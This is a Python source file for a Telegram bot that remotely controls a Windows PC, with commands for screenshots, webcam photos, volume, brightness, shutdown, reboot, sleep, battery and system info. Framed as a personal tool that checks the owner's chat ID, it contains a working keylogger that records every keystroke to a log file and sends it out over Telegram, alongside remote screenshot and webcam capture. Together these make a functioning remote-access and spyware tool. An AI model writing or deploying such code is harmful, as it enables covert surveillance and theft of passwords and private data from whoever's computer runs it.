################################################################################
# system
import os
import time
import ctypes
import platform
################################################################################
# bot
from telebot import types
import telebot
################################################################################
# screenshot
from mss import mss
################################################################################
# volume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
################################################################################
# brightness
import screen_brightness_control as sbc
################################################################################
# mouse
import mouse
################################################################################
# battery status
import psutil
################################################################################
# ip
import socket
################################################################################
# keylogger
# ! pip install pynput
import pynput
from pynput.keyboard import Key, Listener
# modules
################################################################################
from inputData import getData, Data


#? ToDo-list:
# list of favorite programs
# open link

# open in youtube
# spotify control

# open programm fullscreen
# pause sound / video
# next/previous sound/video

# gui


#/ done ✅
#* brightness up/down
#* volume up/down

#* screenshot
#* webcam photo
#* keylogger

#* check battery
#* get ip
#* get id

#* pc info
#* pc status

#* lock pc
#* shutdown pc
#* reboot pc
#* sleep pc
#* cancel shutdown/reboot/sleep

#* battery info

#* stop bot



#? global variables
#/ bot
user = getData()
bot = telebot.TeleBot(user.TOKEN)

#/ volume
volDevices = AudioUtilities.GetSpeakers()
volInterface = volDevices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
vol = cast(volInterface, POINTER(IAudioEndpointVolume))

#/ sleep
sleepFlag = False

# / keylogger
keyloggerFlag = False
count = 0
keys = []


print('🚀 Bot launched')
# bot.send_message(user.ID, '🚀 Bot launched')



################################################################################ start
@bot.message_handler(commands = ['start'])
def Start(message):
    bot.send_message(message.chat.id, '🚀  Bot launched')
    bot.send_message(message.chat.id, 'Use  */help*  for more info', parse_mode = 'Markdown')


################################################################################ help
@bot.message_handler(commands = ['help'])
def Help(message):
    bot.send_message(message.chat.id, '''
*ℹ️  Information about bot:*\n
*🚀  /start* - Start bot\n
*ℹ️  /help* - Commands list\n
*🏞  /screenshot* - Take screenshot\n
*📸  /webcam* - Take webcam photo\n
*⌨️  /keylogger* - Start keylogger\n
*🔊  /volume* - Set volume to [value]\n
*☀️  /brightness* - Set brightness to [value]\n
*🖱  /mouse* - Set mouse position\n
*🔒  /lock* - Lock your PC\n
*⚠️  /shutdown* - Shutdown your PC\n
*🔄  /reboot* - Restart your PC\n
*💤  /sleep* - Hibernate your PC\n
*🔋  /battery* - Show battery status\n
*🛰️  /ip* - Show your IP\n
*🆔  /getId * - Get your telegram ID\n
*⚙️  /info* - Show PC info\n
*🖥️  /status* - Show PC status\n
*⛔  /stop* - Stop bot\n
    ''', parse_mode = 'Markdown')


################################################################################ screenshot
@bot.message_handler(commands = ['screenshot', 'screen'])
def Screenshot(message):
    if message.chat.id != user.ID:
        return Warn(message)
    bot.send_chat_action(user.ID ,'upload_photo')
    bot.send_message(message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
    with mss() as screen:
        screen.shot(mon = -1, output = 'Screenshot.png')
    if not os.path.exists('./Screenshot.png'):
        return bot.send_message(message.chat.id, '*🏞  Error*, screenshot not found', parse_mode = 'Markdown')
    bot.send_document(message.chat.id, open('Screenshot.png', 'rb'))
    os.remove('Screenshot.png')


################################################################################ webcam
@bot.message_handler(commands = ['webcam', 'cam'])
def Webcam(message):
    if message.chat.id != user.ID:
        return Warn(message)
    bot.send_chat_action(message.chat.id, 'upload_photo')
    os.system('python webcam.py')
    if not os.path.exists('./Webcam.png'):
        return bot.send_message(message.chat.id, '*⛔  Error*, can\'t access camera', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
    bot.send_document(message.chat.id, open('Webcam.png', 'rb'))
    os.remove('Webcam.png')


################################################################################ keylogger
@bot.message_handler(commands = ['keylogger', 'key', 'log'])
def Keylogger(message):
    if message.chat.id != user.ID:
        return Warn(message)
    global keyloggerFlag
    keyloggerFlag = False
    markupInlineDisableKeylogger = types.InlineKeyboardMarkup()
    btnDisableKeylogger = types.InlineKeyboardButton(text = 'Disable', callback_data = 'disableKeylogger')
    markupInlineDisableKeylogger.add(btnDisableKeylogger)
    bot.send_message(message.chat.id, '⌨️  Keylogger *activated*', parse_mode = 'Markdown', reply_markup = markupInlineDisableKeylogger)
    if os.path.exists('./Logs.txt'):
        os.remove('Logs.txt')
    with Listener(on_press = onPress, on_release = onRelease) as listener:
        listener.join()
def onPress(key):
    global count, keys
    keys.append(key)
    count += 1
    # print(f'{key} pressed')
    if count >= 1:
        writeFile(keys)
        count = 0
        keys = []
def onRelease(key):
    global keyloggerFlag
    if keyloggerFlag:
        keyloggerFlag = False
        return False
def writeFile(keys):
    with open('Logs.txt', 'a') as f:
        for key in keys:
            k = str(key).replace('\'', '')
            print(key)
            # if k.find('space') > 0:
            #     f.write('\n')
            if k.find('enter') > 0:
                f.write('[ENTER]\n')
            elif k.find('Key.') != -1:
                k = k.replace('Key.', '[') + ']'
                f.write(k.upper())
            elif k.find('Key') == -1:
                f.write(k)


################################################################################ volume
@bot.message_handler(commands = ['volume', 'vol'])
def Volume(message):
    if message.chat.id != user.ID:
        return Warn(message)
    currentVolume = getCurrentVolume()
    emoji = getVolumeEmoji(currentVolume)
    bot.send_message(message.chat.id, f'{emoji} Current volume is *{currentVolume}%*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'Enter new volume:')
    bot.register_next_step_handler(message, Volume_process)
def Volume_process(message):
    volume = message.text
    if not volume.isdigit():
        return bot.send_message(message.chat.id, 'Volume must be a number')
    volumeInt = int(volume)
    if volumeInt < 0 or volumeInt > 100:
        return bot.send_message(message.chat.id, 'Volume must be *> 0* and *< 100*', parse_mode = 'Markdown')
    emoji = getVolumeEmoji(volumeInt)
    scalarVolume = volumeInt / 100
    vol.SetMasterVolumeLevelScalar(scalarVolume, None)
    bot.send_message(message.chat.id, f'{emoji} Volume set to *{message.text}%*', parse_mode = 'Markdown')
def getCurrentVolume():
    return int(round(vol.GetMasterVolumeLevelScalar() * 100))
def getVolumeEmoji(volume):
    if volume == 0:
        return '🔇'
    elif volume <= 33:
        return '🔈'
    elif volume <= 66:
        return '🔉'
    else:
        return '🔊'


################################################################################ brightness
@bot.message_handler(commands = ['brightness', 'bright'])
def Brightness(message):
    if message.chat.id != user.ID:
        return Warn(message)
    currentBrightness = getCurrentBrightness()
    emoji = getBrightnessEmoji(currentBrightness)
    bot.send_message(message.chat.id, f'{emoji} Current brightness is *{currentBrightness}%*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'Enter new brightness:')
    bot.register_next_step_handler(message, Brightness_process)
def Brightness_process(message):
    brightness = message.text
    if not brightness.isdigit():
        return bot.send_message(message.chat.id, 'Brightness must be a number')
    brightnessInt = int(brightness)
    if brightnessInt < 0 or brightnessInt > 100:
        return bot.send_message(message.chat.id, 'Brightness must be *> 0* and *< 100*', parse_mode = 'Markdown')
    emoji = getBrightnessEmoji(brightnessInt)
    sbc.set_brightness(brightnessInt)
    bot.send_message(message.chat.id, f'{emoji} Brightness set to *{message.text}%*', parse_mode = 'Markdown')
def getCurrentBrightness():
    return sbc.get_brightness()[0]
def getBrightnessEmoji(brightness):
    if brightness < 33:
        return '🔅'
    elif brightness < 66:
        return '🔆'
    else:
        return '☀️'


################################################################################ lock
@bot.message_handler(commands = ['lock'])
def Lock(message):
    if message.chat.id != user.ID:
        return Warn(message)
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    ctypes.windll.user32.LockWorkStation()
    bot.send_message(message.chat.id, '*Locked 🔒*', parse_mode = 'Markdown')


################################################################################ shutdown
@bot.message_handler(commands = ['shutdown', 'sd'])
def Shutdown(message):
    if message.chat.id != user.ID:
        return Warn(message)
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'How many *seconds* to turn off the PC?', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Shutdown_process)
def Shutdown_process(message):
    if not message.text.isdigit():
        return bot.send_message(message.chat.id, 'Time must be a number')
    seconds = int(message.text)
    markupInlineCancelShutdown = types.InlineKeyboardMarkup()
    btnCancelShutdown = types.InlineKeyboardButton(text = 'Cancel', callback_data = 'cancelShutdown')
    markupInlineCancelShutdown.add(btnCancelShutdown)
    bot.send_message(message.chat.id, f'⚠️  Shutting down in *{seconds}s*', parse_mode = 'Markdown', reply_markup = markupInlineCancelShutdown)
    os.system(f'shutdown -s -t {seconds}')


################################################################################ reboot
@bot.message_handler(commands = ['reboot', 'rb'])
def Reeboot(message):
    if message.chat.id != user.ID:
        return Warn(message)
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'How many *seconds* to restart the PC?', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Reboot_process)
def Reboot_process(message):
    if not message.text.isdigit():
        return bot.send_message(message.chat.id, 'Time must be a number')
    seconds = int(message.text)
    markupInlineCancelReboot = types.InlineKeyboardMarkup()
    btnCancelReboot = types.InlineKeyboardButton(text = 'Cancel', callback_data = 'cancelReboot')
    markupInlineCancelReboot.add(btnCancelReboot)
    bot.send_message(message.chat.id, f'🔄  Reboot in *{seconds}s*', parse_mode = 'Markdown', reply_markup = markupInlineCancelReboot)
    os.system(f'shutdown -r -t {seconds}')


################################################################################ sleep
@bot.message_handler(commands = ['sleep'])
def Sleep(message):
    if message.chat.id != user.ID:
        return Warn(message)
    global sleepFlag
    sleepFlag = False
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    bot.send_message(
        message.chat.id, 'How many *seconds* to sleep?', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Sleep_process)
def Sleep_process(message):
    global sleepFlag
    if not message.text.isdigit():
        return bot.send_message(message.chat.id, 'Time must be a number')
    seconds = int(message.text)
    markupInlineCancelSleep = types.InlineKeyboardMarkup()
    btnCancelSleep = types.InlineKeyboardButton(text = 'Cancel', callback_data = 'cancelSleep')
    markupInlineCancelSleep.add(btnCancelSleep)
    bot.send_message(message.chat.id, f'💤  Sleeping in *{seconds}s*', parse_mode = 'Markdown', reply_markup = markupInlineCancelSleep)
    for i in range(seconds):
        time.sleep(1)
        if sleepFlag:
            sleepFlag = False
            return
    os.system('shutdown /h')


################################################################################ battery
@bot.message_handler(commands = ['battery'])
def Battery(message):
    if message.chat.id != user.ID:
        return Warn(message)
    battery = getBattery()
    status = isCharging()
    msg = f'{getBatteryEmoji(battery)}  Battery level is *{battery}*%\n'
    msg += f'{chargingEmoji(status)}  Сharging:  *{status}*'
    bot.send_message(message.chat.id, msg, parse_mode = 'Markdown')
def getBattery():
    return psutil.sensors_battery().percent
def getBatteryEmoji(battery):
    if battery <= 33:
        return '🪫'
    else:
        return '🔋'
def isCharging():
    return psutil.sensors_battery().power_plugged
def chargingEmoji(status):
    if status:
        return '⚡️'
    else:
        return '🔌'


################################################################################ ip
@bot.message_handler(commands = ['ip'])
def SendIP(message):
    if message.chat.id != user.ID:
        return Warn(message)
    ip = getIP()
    bot.send_message(message.chat.id, f'🛰️ Your *IP* is *{ip}*', parse_mode = 'Markdown')
def getIP():
    return socket.gethostbyname(socket.gethostname())


################################################################################ get id
@bot.message_handler(commands = ['getId', 'id'])
def getID(message):
    bot.send_message(message.from_user.id, f'🆔  Your *ID* is *{message.from_user.id}*', parse_mode = 'Markdown')


################################################################################ info
@bot.message_handler(commands = ['info', 'pc', 'pc_info'])
def PcInfo(message):
    if message.chat.id != user.ID:
        return Warn(message)
    uname = platform.uname()

    msg = '⚙️  *Info about your PC*\n\n'
    # OS
    msg += f'OS:  *{uname.system} {uname.release} {uname.version}*\n'
    msg += f'Name:  *{uname.node}*\n'
    # CPU
    msg += f"Processor:  *{uname.processor}*"
    msg += f'Core:  *{psutil.cpu_count(logical = True)}*\n'
    # RAM
    msg += f'📊  RAM: *{getSize(psutil.virtual_memory().total)}*\n'
    # IP
    msg += f'🛰️  IP: *{getIP()}*'
    bot.send_message(message.chat.id, msg, parse_mode = "markdown")


################################################################################ status
@bot.message_handler(commands = ['status', 'pc_status'])
def PcStatus(message):
    if message.chat.id != user.ID:
        return Warn(message)
    virtualMem = psutil.virtual_memory()
    battery = getBattery()
    status = isCharging()
    brightness = getCurrentBrightness()
    volume = getCurrentVolume()

    msg = '🖥️  *Your PC Status*\n\n'
    msg += f'📊  Total CPU Usage:  *{psutil.cpu_percent()}%*\n'
    msg += f'🆓  RAM Available:  *{getSize(virtualMem.available)}*\n'
    msg += f'📟  RAM Used:  *{getSize(virtualMem.used)}*\n'
    msg += f'📊  RAM used percentage:  *{virtualMem.percent}%*\n\n'
    msg += f'{getBatteryEmoji(battery)}  Battery level:  *{battery}%*\n'
    msg += f'{chargingEmoji(status)}  Сharging:  *{status}*\n'
    msg += f'{getBrightnessEmoji(brightness)}  Brightness:  *{brightness}%*\n'
    msg += f'{getVolumeEmoji(volume)}  Volume:  *{volume}%*\n'
    bot.send_message(message.chat.id, msg, parse_mode = "markdown")
def getSize(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


################################################################################ stop
@bot.message_handler(commands = ['stop'])
def stopBot(message):
    if message.chat.id != user.ID:
        return Warn(message)
    bot.send_message(message.chat.id, '*⛔  Bot stopped*', parse_mode = 'Markdown')
    bot.stop_polling()
    print('⛔ Bot stopped')
    sys.exit()



################################################################################ / callback handler
@bot.callback_query_handler(func = lambda call: True)
def TurnOffCallback(call):
    if call.data == 'cancelShutdown':
        os.system('shutdown /a')
        bot.send_message(call.message.chat.id, '🛑  Shutdown *canceled*', parse_mode = 'Markdown')
    elif call.data == 'cancelReboot':
        os.system('shutdown /a')
        bot.send_message(call.message.chat.id, '🛑  Reboot *canceled*', parse_mode = 'Markdown')
    elif call.data == 'cancelSleep':
        global sleepFlag
        sleepFlag = True
        bot.send_message(call.message.chat.id, '🛑  Sleep *canceled*', parse_mode = 'Markdown')
    elif call.data == 'disableKeylogger':
        global keyloggerFlag, keys
        keys = []
        bot.send_chat_action(call.message.chat.id, 'upload_document')
        keyloggerFlag = True
        bot.send_message(call.message.chat.id, '⛔  Keylogger *disactivated*', parse_mode = 'Markdown')
        if not os.path.exists('./Logs.txt'):
            bot.send_message(call.message.chat.id, '*📄  Error*, logs not found', parse_mode = 'Markdown')
        bot.send_message(call.message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
        bot.send_document(call.message.chat.id, open('Logs.txt', 'rb'))
        os.remove('Logs.txt')


################################################################################ warn
def Warn(message):
    bot.send_chat_action(message.chat.id, 'typing')
    bot.send_chat_action(user.ID, 'typing')
    # other user
    bot.send_message(message.chat.id, '⚠️  *Warning*\n\n' + 'You are not allowed to use this bot', parse_mode = 'Markdown')
    # main
    msg = f'*⚠️  Someone just used  {message.text}*\n\n'
    if message.from_user.username != None:
        msg += f'Username:  *@{message.from_user.username}*\n'
    if message.from_user.first_name != None:
        msg += f'First Name:  *{message.from_user.first_name}*\n'
    if message.from_user.last_name != None:
        msg += f'Last Name:  *{message.from_user.last_name}*\n'
    msg += f'User Id:  *{message.from_user.id}*\n\n'
    bot.send_message(user.ID, f'{msg}', parse_mode = 'Markdown')


################################################################################ infinite polling
bot.polling(none_stop = True)